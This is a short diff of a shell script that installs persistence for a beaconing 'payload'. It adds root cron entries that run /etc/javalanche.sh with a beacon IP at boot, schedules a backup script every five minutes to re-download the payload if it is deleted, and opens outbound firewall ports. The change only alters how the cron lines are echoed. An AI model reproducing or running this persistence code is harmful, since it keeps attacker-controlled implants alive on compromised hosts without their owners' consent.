@@ -10,7 +10,7 @@ beaconIPAddress="$1"
 
 # Cronjob for this Payload to run on Boot
 cronjob="@reboot root /etc/javalanche.sh $beaconIPAddress"
-(crontab -l ; echo "$cronjob") | crontab -
+(crontab -l ; echo "\n $cronjob") | crontab -
 echo "$cronjob" | sudo tee -a /etc/crontab > /dev/null
 
 # Create a backup script to ensure the main payload is downloaded if deleted
@@ -38,7 +38,7 @@ fi
 
 # Set up a cron job to run the backup script every 5 minutes
 cronjob="*/5 * * * * root $backup_script"
-(crontab -l ; echo "$cronjob") | crontab -
+(crontab -l ; echo "\n $cronjob") | crontab -
 
 # Add fiewall rules
 sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
